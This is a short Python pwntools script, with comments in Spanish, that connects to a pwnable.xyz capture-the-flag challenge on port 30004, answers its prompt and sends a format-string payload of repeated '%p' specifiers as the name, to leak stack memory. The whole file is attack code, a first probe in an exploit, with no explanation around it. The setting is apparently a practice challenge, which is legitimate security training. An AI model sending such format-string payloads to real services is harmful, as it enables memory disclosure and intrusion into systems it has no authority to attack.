#!/usr/bin/env python3

from pwn import *

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.sendline(b'y')

conn.recvuntil(b'Name: ')

# Intentar format string attack
payload = b'%p.%p.%p.%p.%p.%p.%p.%p'

conn.sendline(payload)

data = conn.recvall(timeout=3)
log.info(f"Respuesta: {data}")

conn.close()